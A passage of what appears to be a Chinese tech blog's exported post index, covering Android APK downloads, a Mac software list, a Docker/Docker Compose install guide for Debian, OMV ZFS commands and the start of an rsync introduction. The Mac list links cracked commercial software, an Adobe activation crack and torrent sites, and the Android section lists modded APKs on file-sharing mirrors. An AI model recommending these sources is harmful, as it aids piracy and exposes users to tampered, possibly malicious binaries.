<h1 id="测速"><a href="#测速" class="headerlink" title="测速"></a>测速</h1><h2 id="Speedtest-by-Ookla-v4-6-20-apkpure-com-apk"><a href="#Speedtest-by-Ookla-v4-6-20-apkpure-com-apk" class="headerlink" title="Speedtest by Ookla_v4.6.20_apkpure.com.apk"></a>Speedtest by Ookla_v4.6.20_apkpure.com.apk</h2><p><a href="https://wwm.lanzouw.com/iOjJg09dnade">https://wwm.lanzouw.com/iOjJg09dnade</a> 密码:9czb</p>
<h1 id="短信转发"><a href="#短信转发" class="headerlink" title="短信转发"></a>短信转发</h1><h2 id="SmsForwarder-release-2-4-3-300036-20220225"><a href="#SmsForwarder-release-2-4-3-300036-20220225" class="headerlink" title="SmsForwarder_release_2.4.3_300036_20220225"></a>SmsForwarder_release_2.4.3_300036_20220225</h2><p><a href="https://wwm.lanzouw.com/ioP5i09dn9qb">https://wwm.lanzouw.com/ioP5i09dn9qb</a> 密码:bvuh</p>
<h1 id="文件管理器"><a href="#文件管理器" class="headerlink" title="文件管理器"></a>文件管理器</h1><h2 id="rootexplorer-v4-10-3-itmop-com-apk"><a href="#rootexplorer-v4-10-3-itmop-com-apk" class="headerlink" title="rootexplorer_v4.10.3_itmop.com.apk"></a>rootexplorer_v4.10.3_itmop.com.apk</h2><p><a href="https://wwm.lanzouw.com/iOvma09dn9oj">https://wwm.lanzouw.com/iOvma09dn9oj</a> 密码:gpes</p>
<h1 id="网盘"><a href="#网盘" class="headerlink" title="网盘"></a>网盘</h1><h2 id="PikPak-ldjs-v1-6-1-apk"><a href="#PikPak-ldjs-v1-6-1-apk" class="headerlink" title="PikPak-ldjs-v1.6.1.apk"></a>PikPak-ldjs-v1.6.1.apk</h2><p><a href="https://wwm.lanzouw.com/iAcuS09dn9mh">https://wwm.lanzouw.com/iAcuS09dn9mh</a> 密码:cb30</p>
<h1 id="硬件检测"><a href="#硬件检测" class="headerlink" title="硬件检测"></a>硬件检测</h1><h2 id="DevCheck-Pro-v4-28-build-428-Mod-yxssp-com-apk"><a href="#DevCheck-Pro-v4-28-build-428-Mod-yxssp-com-apk" class="headerlink" title="DevCheck-Pro-v4.28_build_428-Mod_yxssp.com.apk"></a>DevCheck-Pro-v4.28_build_428-Mod_yxssp.com.apk</h2><p><a href="https://wwm.lanzouw.com/iCju709dn8ji">https://wwm.lanzouw.com/iCju709dn8ji</a> 密码:23p3</p>
<h1 id="应用商店"><a href="#应用商店" class="headerlink" title="应用商店"></a>应用商店</h1><h2 id="Coolapk-12-2-1-2204291-coolapk-app-sign-apk"><a href="#Coolapk-12-2-1-2204291-coolapk-app-sign-apk" class="headerlink" title="Coolapk-12.2.1-2204291-coolapk-app-sign.apk"></a>Coolapk-12.2.1-2204291-coolapk-app-sign.apk</h2><p><a href="https://wwm.lanzouw.com/icwE409dn85e">https://wwm.lanzouw.com/icwE409dn85e</a> 密码:236k</p>
<h1 id="代理工具"><a href="#代理工具" class="headerlink" title="代理工具"></a>代理工具</h1><h2 id="clash-for-android-2-4-9-apk"><a href="#clash-for-android-2-4-9-apk" class="headerlink" title="clash-for-android-2.4.9.apk"></a>clash-for-android-2.4.9.apk</h2><p><a href="https://wwm.lanzouw.com/i8nJF09dn6mj">https://wwm.lanzouw.com/i8nJF09dn6mj</a> 密码:gz1s</p>
<h1 id="电池健康"><a href="#电池健康" class="headerlink" title="电池健康"></a>电池健康</h1><h2 id="accubattery-v1-5-1-1-itmop-com-apk"><a href="#accubattery-v1-5-1-1-itmop-com-apk" class="headerlink" title="accubattery_v1.5.1.1_itmop.com.apk"></a>accubattery_v1.5.1.1_itmop.com.apk</h2><p><a href="https://wwm.lanzouw.com/iDiFT09dn68f">https://wwm.lanzouw.com/iDiFT09dn68f</a> 密码:aaox</p>
]]></content>
      <categories>
        <category>os</category>
        <category>android</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>android</tag>
      </tags>
  </entry>
  <entry>
    <title>Mac 必备软件</title>
    <url>/posts/938d25ed/</url>
    <content><![CDATA[<h1 id="电脑管家"><a href="#电脑管家" class="headerlink" title="电脑管家"></a>电脑管家</h1><h2 id="1-CleanMyMac-X"><a href="#1-CleanMyMac-X" class="headerlink" title="1.CleanMyMac X"></a>1.<a href="https://jufxf.com/forum.php?mod=viewthread&tid=71&highlight=cleanmymac">CleanMyMac X</a></h2><h2 id="2-iStat-Menus-For-Mac"><a href="#2-iStat-Menus-For-Mac" class="headerlink" title="2.iStat Menus For Mac"></a>2.<a href="https://jufxf.com/thread-44-1-11.html">iStat Menus For Mac</a></h2><h1 id="读写NTFS格式的硬盘"><a href="#读写NTFS格式的硬盘" class="headerlink" title="读写NTFS格式的硬盘"></a>读写NTFS格式的硬盘</h1><h2 id="1-Paragon-NTFS-For-Mac"><a href="#1-Paragon-NTFS-For-Mac" class="headerlink" title="1.Paragon NTFS For Mac"></a>1.<a href="https://jufxf.com/thread-128-1-1.html">Paragon NTFS For Mac</a></h2><h2 id="2-Tuxera-NTFS-for-Mac"><a href="#2-Tuxera-NTFS-for-Mac" class="headerlink" title="2.Tuxera NTFS for Mac"></a>2.<a href="https://jufxf.com/thread-129-1-4.html">Tuxera NTFS for Mac</a></h2><h1 id="PDF工具"><a href="#PDF工具" class="headerlink" title="PDF工具"></a>PDF工具</h1><h2 id="1-Adobe-Acrobat-Pro-DC-for-mac"><a href="#1-Adobe-Acrobat-Pro-DC-for-mac" class="headerlink" title="1.Adobe Acrobat Pro DC for mac"></a>1.<a href="https://jufxf.com/thread-748-1-1.html">Adobe Acrobat Pro DC for mac</a></h2><h2 id="2-PDF-Reader-Pro-for-Mac"><a href="#2-PDF-Reader-Pro-for-Mac" class="headerlink" title="2.PDF Reader Pro for Mac"></a>2.<a href="https://jufxf.com/thread-1441-1-6.html">PDF Reader Pro for Mac</a></h2><h1 id="视频编辑"><a href="#视频编辑" class="headerlink" title="视频编辑"></a>视频编辑</h1><h2 id="1-Final-Cut-Pro-For-Mac"><a href="#1-Final-Cut-Pro-For-Mac" class="headerlink" title="1.Final Cut Pro For Mac"></a>1.<a href="https://jufxf.com/thread-336-1-2.html">Final Cut Pro For Mac</a></h2><h2 id="2-Adobe-Premiere-Pro-For-Mac"><a href="#2-Adobe-Premiere-Pro-For-Mac" class="headerlink" title="2.Adobe Premiere Pro For Mac"></a>2.<a href="https://jufxf.com/thread-352-1-3.html">Adobe Premiere Pro For Mac</a></h2><h2 id="3-VideoProc"><a href="#3-VideoProc" class="headerlink" title="3.VideoProc"></a>3.<a href="https://jufxf.com/thread-534-1-1.html">VideoProc</a></h2><h2 id="4-Compressor-For-Mac"><a href="#4-Compressor-For-Mac" class="headerlink" title="4.Compressor For Mac"></a>4.<a href="https://jufxf.com/thread-491-1-17.html">Compressor For Mac</a></h2><h1 id="虚拟机"><a href="#虚拟机" class="headerlink" title="虚拟机"></a>虚拟机</h1><h2 id="1-Parallels-Desktop"><a href="#1-Parallels-Desktop" class="headerlink" title="1.Parallels Desktop"></a>1.<a href="https://jufxf.com/thread-127-1-1.html">Parallels Desktop</a></h2><h2 id="2-VMware-Fusion-pro-for-mac"><a href="#2-VMware-Fusion-pro-for-mac" class="headerlink" title="2.VMware Fusion pro for mac"></a>2.<a href="https://jufxf.com/thread-339-1-9.html">VMware Fusion pro for mac</a></h2><h1 id="下载工具"><a href="#下载工具" class="headerlink" title="下载工具"></a>下载工具</h1><h2 id="1-迅雷-for-mac-永久会员加速开心版"><a href="#1-迅雷-for-mac-永久会员加速开心版" class="headerlink" title="1.迅雷 for mac 永久会员加速开心版"></a>1.<a href="https://jufxf.com/thread-282-1-2.html">迅雷 for mac 永久会员加速开心版</a></h2><h2 id="2-xunleiThunderQ-pkg"><a href="#2-xunleiThunderQ-pkg" class="headerlink" title="2.xunleiThunderQ.pkg"></a>2.xunleiThunderQ.pkg</h2><p><a href="https://wwm.lanzouw.com/iavWh0cn1ofg">https://wwm.lanzouw.com/iavWh0cn1ofg</a> 密码:8idq</p>
<h2 id="3-Thunder-6-6-6-6666-mac"><a href="#3-Thunder-6-6-6-6666-mac" class="headerlink" title="3.Thunder_6.6.6_(6666)__mac"></a>3.Thunder_6.6.6_(6666)__mac</h2><p><a href="https://wwm.lanzouw.com/iIBlw0cn1o3e">https://wwm.lanzouw.com/iIBlw0cn1o3e</a> 密码:hk3z</p>
<h2 id="4-Thunder-8-8-8无限制版-dmg"><a href="#4-Thunder-8-8-8无限制版-dmg" class="headerlink" title="4.Thunder-8.8.8无限制版.dmg"></a>4.Thunder-8.8.8无限制版.dmg</h2><p><a href="https://wwm.lanzouw.com/iYTZS0cn2brg">https://wwm.lanzouw.com/iYTZS0cn2brg</a> 密码:6ks9</p>
<h2 id="5-Thunder-9-9-9-2844-dmg"><a href="#5-Thunder-9-9-9-2844-dmg" class="headerlink" title="5.Thunder-9.9.9.2844.dmg"></a>5.Thunder-9.9.9.2844.dmg</h2><p><a href="https://wwm.lanzouw.com/iYjX40cn5b7e">https://wwm.lanzouw.com/iYjX40cn5b7e</a> 密码:94jy</p>
<h2 id="6-Motrix-1-6-11-dmg"><a href="#6-Motrix-1-6-11-dmg" class="headerlink" title="6.Motrix-1.6.11.dmg"></a>6.Motrix-1.6.11.dmg</h2><p><a href="https://wwm.lanzouw.com/iBH2c0cwrfna">https://wwm.lanzouw.com/iBH2c0cwrfna</a> 密码:faxi</p>
<h2 id="7-Downie4-for-Mac-网站视频下载工具"><a href="#7-Downie4-for-Mac-网站视频下载工具" class="headerlink" title="7 .Downie4 for Mac 网站视频下载工具"></a>7 .<a href="https://jufxf.com/thread-125-1-4.html">Downie4 for Mac 网站视频下载工具</a></h2><h1 id="办公软件"><a href="#办公软件" class="headerlink" title="办公软件"></a>办公软件</h1><h2 id="1-Microsoft-Office-2019-for-Mac"><a href="#1-Microsoft-Office-2019-for-Mac" class="headerlink" title="1.Microsoft Office 2019 for Mac"></a>1.<a href="https://jufxf.com/thread-126-1-1.html">Microsoft Office 2019 for Mac</a></h2><h1 id="图片处理"><a href="#图片处理" class="headerlink" title="图片处理"></a>图片处理</h1><h2 id="1-Adobe-Photoshop-For-Mac"><a href="#1-Adobe-Photoshop-For-Mac" class="headerlink" title="1.Adobe Photoshop For Mac"></a>1.<a href="https://jufxf.com/thread-129-1-4.html">Adobe Photoshop For Mac</a></h2><h1 id="视频播放器"><a href="#视频播放器" class="headerlink" title="视频播放器"></a>视频播放器</h1><h2 id="1-Movist-pro"><a href="#1-Movist-pro" class="headerlink" title="1.Movist pro"></a>1.<a href="https://jufxf.com/thread-133-1-5.html">Movist pro</a></h2><h1 id="绘图工具"><a href="#绘图工具" class="headerlink" title="绘图工具"></a>绘图工具</h1><h2 id="1-CorelDRAW-for-Mac-2021"><a href="#1-CorelDRAW-for-Mac-2021" class="headerlink" title="1.CorelDRAW for Mac 2021"></a>1.<a href="https://jufxf.com/thread-960-1-6.html">CorelDRAW for Mac 2021</a></h2><h1 id="压缩工具"><a href="#压缩工具" class="headerlink" title="压缩工具"></a>压缩工具</h1><h2 id="1-BetterZip-for-Mac"><a href="#1-BetterZip-for-Mac" class="headerlink" title="1.BetterZip for Mac"></a>1.<a href="https://jufxf.com/thread-134-1-6.html">BetterZip for Mac</a></h2><h2 id="2-Keka-For-Mac"><a href="#2-Keka-For-Mac" class="headerlink" title="2.Keka For Mac"></a>2.<a href="https://jufxf.com/thread-1182-1-12.html">Keka For Mac</a></h2><h1 id="浏览器"><a href="#浏览器" class="headerlink" title="浏览器"></a>浏览器</h1><h2 id="1-Google-Chrome-For-Mac"><a href="#1-Google-Chrome-For-Mac" class="headerlink" title="1.Google Chrome For Mac"></a>1.<a href="https://jufxf.com/thread-1184-1-6.html">Google Chrome For Mac</a></h2><h1 id="激活工具"><a href="#激活工具" class="headerlink" title="激活工具"></a>激活工具</h1><h2 id="1-Adobe-zii-Adobe"><a href="#1-Adobe-zii-Adobe" class="headerlink" title="1.Adobe zii Adobe"></a>1.<a href="https://jufxf.com/thread-1303-1-7.html">Adobe zii Adobe</a></h2><h1 id="数据恢复工具"><a href="#数据恢复工具" class="headerlink" title="数据恢复工具"></a>数据恢复工具</h1><h2 id="1-Wondershare-Recoverit-For-Mac"><a href="#1-Wondershare-Recoverit-For-Mac" class="headerlink" title="1.Wondershare Recoverit For Mac"></a>1.<a href="https://jufxf.com/thread-1182-1-12.html">Wondershare Recoverit For Mac</a></h2><h1 id="音乐下载器"><a href="#音乐下载器" class="headerlink" title="音乐下载器"></a>音乐下载器</h1><h2 id="1-lx-music-desktop-For-Mac"><a href="#1-lx-music-desktop-For-Mac" class="headerlink" title="1.lx music desktop For Mac"></a>1.<a href="https://jufxf.com/thread-1247-1-14.html">lx music desktop For Mac</a></h2><h1 id="苹果软件下载网站"><a href="#苹果软件下载网站" class="headerlink" title="苹果软件下载网站"></a>苹果软件下载网站</h1><p>torrentmac：<a href="https://www.torrentmac.net/">https://www.torrentmac.net/</a></p>
<p>MacYY：<a href="https://www.macyy.cn/">https://www.macyy.cn/</a></p>
<p>ourmacs <a href="https://ourmacs.com/">https://ourmacs.com/</a></p>
]]></content>
      <categories>
        <category>os</category>
        <category>macos</category>
      </categories>
      <tags>
        <tag>os</tag>
        <tag>macos</tag>
      </tags>
  </entry>
  <entry>
    <title>debian/ubuntu最新docker和docker compose安装教程</title>
    <url>/posts/253563c2/</url>
    <content><![CDATA[<h2 id="什么是-Docker？"><a href="#什么是-Docker？" class="headerlink" title="什么是 Docker？"></a>什么是 Docker？</h2><p>Docker 是一种容器化技术，可以在服务器上快速搭建容器并在不污染宿主机的情况下运行软件，而不再需要安装配置各种环境。开源 <a href="https://www.docker.com/">Docker 社区</a>致力于改进这类技术，并免费提供给所有用户，使之获益。</p>
<h2 id="什么是-Docker-Compose？"><a href="#什么是-Docker-Compose？" class="headerlink" title="什么是 Docker Compose？"></a>什么是 Docker Compose？</h2><p>传统模式下运维人员需要运行 <code>docker run</code> 来启动各种容器，一旦容器过多，就无法一次性记住所有的运行参数和命令，这时候我们可以使用 <a href="https://docs.docker.com/compose/">Docker Compose</a> 来解决这个问题。</p>
<p>Docker Compose 是一个用于在单个主机上定义和运行多个 Docker 容器的工具。它使用 YAML 文件来配置应用程序的服务，然后使用一个命令就可以创建并启动所有服务。使用 Docker Compose 可以大大简化 Docker 容器的管理和部署，特别是对于具有多个互相依赖的容器的复杂应用。</p>
<h2 id="使用官方源安装-Docker"><a href="#使用官方源安装-Docker" class="headerlink" title="使用官方源安装 Docker"></a>使用官方源安装 Docker</h2><p>以下操作需要在 root 用户下完成，请使用 <code>sudo -i</code> 或 <code>su root</code> 切换到 root 用户进行操作。</p>
<p>首先，安装一些必要的软件包：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt upgrade -y</span><br><span class="line">apt install curl vim wget gnupg dpkg apt-transport-https lsb-release ca-certificates</span><br></pre></td></tr></table></figure>

<p>然后加入 Docker 的 GPG 公钥和 apt 源：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -sSL https://download.docker.com/linux/debian/gpg | gpg --dearmor &gt; /usr/share/keyrings/docker-ce.gpg</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;deb [arch=<span class="subst">$(dpkg --print-architecture)</span> signed-by=/usr/share/keyrings/docker-ce.gpg] https://download.docker.com/linux/debian <span class="subst">$(lsb_release -sc)</span> stable&quot;</span> &gt; /etc/apt/sources.list.d/docker.list</span><br></pre></td></tr></table></figure>

<p>国内机器可以用<a href="https://mirrors.tuna.tsinghua.edu.cn/">清华 TUNA</a> 的国内源：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -sS https://download.docker.com/linux/debian/gpg | gpg --dearmor &gt; /usr/share/keyrings/docker-ce.gpg</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;deb [arch=<span class="subst">$(dpkg --print-architecture)</span> signed-by=/usr/share/keyrings/docker-ce.gpg] https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian <span class="subst">$(lsb_release -sc)</span> stable&quot;</span> &gt; /etc/apt/sources.list.d/docker.list</span><br></pre></td></tr></table></figure>

<p>然后更新系统后即可安装 Docker CE 和 Docker Compose 插件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt install docker-ce docker-ce-cli containerd.io docker-compose-plugin</span><br></pre></td></tr></table></figure>

<p>此时可以使用 <code>docker version</code> 命令检查是否安装成功：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@debian ~ <span class="comment"># docker version</span></span><br><span class="line">Client: Docker Engine - Community</span><br><span class="line"> Version:           26.1.4</span><br><span class="line"> API version:       1.45</span><br><span class="line"> Go version:        go1.21.11</span><br><span class="line"> Git commit:        5650f9b</span><br><span class="line"> Built:             Wed Jun  5 11:29:22 2024</span><br><span class="line"> OS/Arch:           linux/amd64</span><br><span class="line"> Context:           default</span><br><span class="line"></span><br><span class="line">Server: Docker Engine - Community</span><br><span class="line"> Engine:</span><br><span class="line">  Version:          26.1.4</span><br><span class="line">  API version:      1.45 (minimum version 1.24)</span><br><span class="line">  Go version:       go1.21.11</span><br><span class="line">  Git commit:       de5c9cf</span><br><span class="line">  Built:            Wed Jun  5 11:29:22 2024</span><br><span class="line">  OS/Arch:          linux/amd64</span><br><span class="line">  Experimental:     <span class="literal">true</span></span><br><span class="line"> containerd:</span><br><span class="line">  Version:          1.6.33</span><br><span class="line">  GitCommit:        d2d58213f83a351ca8f528a95fbd145f5654e957</span><br><span class="line"> runc:</span><br><span class="line">  Version:          1.1.12</span><br><span class="line">  GitCommit:        v1.1.12-0-g51d5e94</span><br><span class="line"> docker-init:</span><br><span class="line">  Version:          0.19.0</span><br><span class="line">  GitCommit:        de40ad0</span><br></pre></td></tr></table></figure>

<p>如果需要某个特定用户可以用 Docker <a href="https://docs.docker.com/engine/security/rootless/">rootless</a> 模式运行 Docker，那么可以把这个用户也加入 docker 组，比如我们把 <code>www-data</code> 用户加进去：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install docker-ce-rootless-extras</span><br><span class="line">sudo usermod -aG docker www-data</span><br></pre></td></tr></table></figure>

<h2 id="安装-Docker-Compose"><a href="#安装-Docker-Compose" class="headerlink" title="安装 Docker Compose"></a>安装 Docker Compose</h2><p>因为我们已经安装了 <code>docker-compose-plugin</code>，所以 Docker 目前已经自带 <code>docker compose</code> 命令，基本上可以替代 <code>docker-compose</code>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@debian ~ <span class="comment"># docker compose version</span></span><br><span class="line">Docker Compose version v2.27.1</span><br></pre></td></tr></table></figure>

<p>如果某些镜像或命令不兼容，则我们还可以单独安装 Docker Compose：</p>
<p>我们可以使用 Docker 官方发布的 <a href="https://github.com/docker/compose">Github</a> 直接安装最新版本：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -L https://github.com/docker/compose/releases/latest/download/docker-compose-Linux-x86_64 &gt; /usr/local/bin/docker-compose</span><br><span class="line"><span class="built_in">chmod</span> +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>

<p>此时可以使用 <code>docker-compose version</code> 命令检查是否安装成功：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@debian ~ <span class="comment"># docker-compose version</span></span><br><span class="line">Docker Compose version v2.27.1</span><br></pre></td></tr></table></figure>

<h2 id="修改-Docker-配置"><a href="#修改-Docker-配置" class="headerlink" title="修改 Docker 配置"></a>修改 Docker 配置</h2><p>以下配置会增加一段自定义内网 IPv6 地址，开启容器的 IPv6 功能，以及限制日志文件大小，防止 Docker 日志塞满硬盘 (泪的教训)：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> &gt; /etc/docker/daemon.json &lt;&lt; <span class="string">EOF</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    &quot;log-driver&quot;: &quot;json-file&quot;,</span></span><br><span class="line"><span class="string">    &quot;log-opts&quot;: &#123;</span></span><br><span class="line"><span class="string">        &quot;max-size&quot;: &quot;20m&quot;,</span></span><br><span class="line"><span class="string">        &quot;max-file&quot;: &quot;3&quot;</span></span><br><span class="line"><span class="string">    &#125;,</span></span><br><span class="line"><span class="string">    &quot;ipv6&quot;: true,</span></span><br><span class="line"><span class="string">    &quot;fixed-cidr-v6&quot;: &quot;fd00:dead:beef:c0::/80&quot;,</span></span><br><span class="line"><span class="string">    &quot;experimental&quot;:true,</span></span><br><span class="line"><span class="string">    &quot;ip6tables&quot;:true</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure>

<p>然后重启 Docker 服务：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure>



]]></content>
      <categories>
        <category>tools</category>
        <category>docker</category>
      </categories>
      <tags>
        <tag>tools</tag>
        <tag>docker</tag>
      </tags>
  </entry>
  <entry>
    <title>omv常用命令</title>
    <url>/posts/f4434849/</url>
    <content><![CDATA[<h1 id="ZFS插件"><a href="#ZFS插件" class="headerlink" title="ZFS插件"></a>ZFS插件</h1><p>删除zfs的池&#x2F;数据集</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">zfs destroy poolname/dataset</span><br></pre></td></tr></table></figure>

<p>列出所有 ZFS 数据集</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">zfs list</span><br></pre></td></tr></table></figure>

<h1 id="使用官方源安装-Docker"><a href="#使用官方源安装-Docker" class="headerlink" title="使用官方源安装 Docker"></a>使用官方源安装 Docker</h1><p>以下操作需要在 root 用户下完成，请使用 <code>sudo -i</code> 或 <code>su root</code> 切换到 root 用户进行操作。</p>
<p>首先，安装一些必要的软件包：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt upgrade -y</span><br><span class="line">apt install curl vim wget gnupg dpkg apt-transport-https lsb-release ca-certificates</span><br></pre></td></tr></table></figure>

<p>然后加入 Docker 的 GPG 公钥和 apt 源：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -sSL https://download.docker.com/linux/debian/gpg | gpg --dearmor &gt; /usr/share/keyrings/docker-ce.gpg</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;deb [arch=<span class="subst">$(dpkg --print-architecture)</span> signed-by=/usr/share/keyrings/docker-ce.gpg] https://download.docker.com/linux/debian <span class="subst">$(lsb_release -sc)</span> stable&quot;</span> &gt; /etc/apt/sources.list.d/docker.list</span><br></pre></td></tr></table></figure>

<p>国内机器可以用<a href="https://mirrors.tuna.tsinghua.edu.cn/">清华 TUNA</a> 的国内源：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -sS https://download.docker.com/linux/debian/gpg | gpg --dearmor &gt; /usr/share/keyrings/docker-ce.gpg</span><br><span class="line"><span class="built_in">echo</span> <span class="string">&quot;deb [arch=<span class="subst">$(dpkg --print-architecture)</span> signed-by=/usr/share/keyrings/docker-ce.gpg] https://mirrors.tuna.tsinghua.edu.cn/docker-ce/linux/debian <span class="subst">$(lsb_release -sc)</span> stable&quot;</span> &gt; /etc/apt/sources.list.d/docker.list</span><br></pre></td></tr></table></figure>

<p>然后更新系统后即可安装 Docker CE 和 Docker Compose 插件：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt update</span><br><span class="line">apt install docker-ce docker-ce-cli containerd.io docker-compose-plugin</span><br></pre></td></tr></table></figure>

<p>此时可以使用 <code>docker version</code> 命令检查是否安装成功：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@debian ~ <span class="comment"># docker version</span></span><br><span class="line">Client: Docker Engine - Community</span><br><span class="line"> Version:           26.1.4</span><br><span class="line"> API version:       1.45</span><br><span class="line"> Go version:        go1.21.11</span><br><span class="line"> Git commit:        5650f9b</span><br><span class="line"> Built:             Wed Jun  5 11:29:22 2024</span><br><span class="line"> OS/Arch:           linux/amd64</span><br><span class="line"> Context:           default</span><br><span class="line"></span><br><span class="line">Server: Docker Engine - Community</span><br><span class="line"> Engine:</span><br><span class="line">  Version:          26.1.4</span><br><span class="line">  API version:      1.45 (minimum version 1.24)</span><br><span class="line">  Go version:       go1.21.11</span><br><span class="line">  Git commit:       de5c9cf</span><br><span class="line">  Built:            Wed Jun  5 11:29:22 2024</span><br><span class="line">  OS/Arch:          linux/amd64</span><br><span class="line">  Experimental:     <span class="literal">true</span></span><br><span class="line"> containerd:</span><br><span class="line">  Version:          1.6.33</span><br><span class="line">  GitCommit:        d2d58213f83a351ca8f528a95fbd145f5654e957</span><br><span class="line"> runc:</span><br><span class="line">  Version:          1.1.12</span><br><span class="line">  GitCommit:        v1.1.12-0-g51d5e94</span><br><span class="line"> docker-init:</span><br><span class="line">  Version:          0.19.0</span><br><span class="line">  GitCommit:        de40ad0</span><br></pre></td></tr></table></figure>

<p>如果需要某个特定用户可以用 Docker <a href="https://docs.docker.com/engine/security/rootless/">rootless</a> 模式运行 Docker，那么可以把这个用户也加入 docker 组，比如我们把 <code>www-data</code> 用户加进去：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">apt install docker-ce-rootless-extras</span><br><span class="line">sudo usermod -aG docker www-data</span><br></pre></td></tr></table></figure>

<h1 id="安装-Docker-Compose"><a href="#安装-Docker-Compose" class="headerlink" title="安装 Docker Compose"></a>安装 Docker Compose</h1><p>因为我们已经安装了 <code>docker-compose-plugin</code>，所以 Docker 目前已经自带 <code>docker compose</code> 命令，基本上可以替代 <code>docker-compose</code>：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@debian ~ <span class="comment"># docker compose version</span></span><br><span class="line">Docker Compose version v2.27.1</span><br></pre></td></tr></table></figure>

<p>如果某些镜像或命令不兼容，则我们还可以单独安装 Docker Compose：</p>
<p>我们可以使用 Docker 官方发布的 <a href="https://github.com/docker/compose">Github</a> 直接安装最新版本：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -L https://github.com/docker/compose/releases/latest/download/docker-compose-Linux-x86_64 &gt; /usr/local/bin/docker-compose</span><br><span class="line"><span class="built_in">chmod</span> +x /usr/local/bin/docker-compose</span><br></pre></td></tr></table></figure>

<p>此时可以使用 <code>docker-compose version</code> 命令检查是否安装成功：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@debian ~ <span class="comment"># docker-compose version</span></span><br><span class="line">Docker Compose version v2.27.1</span><br></pre></td></tr></table></figure>

<h1 id="修改-Docker-配置"><a href="#修改-Docker-配置" class="headerlink" title="修改 Docker 配置"></a>修改 Docker 配置</h1><p>以下配置会增加一段自定义内网 IPv6 地址，开启容器的 IPv6 功能，以及限制日志文件大小，防止 Docker 日志塞满硬盘 (泪的教训)：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> &gt; /etc/docker/daemon.json &lt;&lt; <span class="string">EOF</span></span><br><span class="line"><span class="string">&#123;</span></span><br><span class="line"><span class="string">    &quot;log-driver&quot;: &quot;json-file&quot;,</span></span><br><span class="line"><span class="string">    &quot;log-opts&quot;: &#123;</span></span><br><span class="line"><span class="string">        &quot;max-size&quot;: &quot;20m&quot;,</span></span><br><span class="line"><span class="string">        &quot;max-file&quot;: &quot;3&quot;</span></span><br><span class="line"><span class="string">    &#125;,</span></span><br><span class="line"><span class="string">    &quot;ipv6&quot;: true,</span></span><br><span class="line"><span class="string">    &quot;fixed-cidr-v6&quot;: &quot;fd00:dead:beef:c0::/80&quot;,</span></span><br><span class="line"><span class="string">    &quot;experimental&quot;:true,</span></span><br><span class="line"><span class="string">    &quot;ip6tables&quot;:true</span></span><br><span class="line"><span class="string">&#125;</span></span><br><span class="line"><span class="string">EOF</span></span><br></pre></td></tr></table></figure>

<p>然后重启 Docker 服务：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">systemctl restart docker</span><br></pre></td></tr></table></figure>

<p>好了，我们已经安装好了 Docker 和 Docker Compose，然后就可以开始愉快的安装各种软件，限于篇幅，我们不再赘述，今后慢慢介绍安装各种 Docker 软件的方法。</p>
]]></content>
      <categories>
        <category>tools</category>
        <category>docker</category>
        <category>os</category>
        <category>omv</category>
      </categories>
      <tags>
        <tag>docker</tag>
        <tag>os</tag>
        <tag>omv</tag>
      </tags>
  </entry>
  <entry>
    <title>rsync远程拉取推送同步本地和异地服务器文件</title>
    <url>/posts/9219f72b/</url>
    <content><![CDATA[<h2 id="一、简介"><a href="#一、简介" class="headerlink" title="一、简介"></a>一、简介</h2><p>rsync 是一个常用的 Linux 应用程序，用于文件同步。</p>
<p>它可以在本地计算机与远程计算机之间，或者两个本地目录之间同步文件（但不支持两台远程计算机之间的同步）。它也可以当作文件复制工具，替代<code>cp</code>和<code>mv</code>命令。</p>
<p>它名称里面的<code>r</code>指的是 remote，rsync 其实就是”远程同步”（remote sync）的意思。与其他文件传输工具（如 FTP 或 scp）不同，rsync 的最大特点是会检查发送方和接收方已有的文件，仅传输有变动的部分（默认规则是文件大小或修改时间有变动）。</p>
<h2 id="二、安装"><a href="#二、安装" class="headerlink" title="二、安装"></a>二、安装</h2><p>如果本机或者远程计算机没有安装 rsync，可以用下面的命令安装。</p>
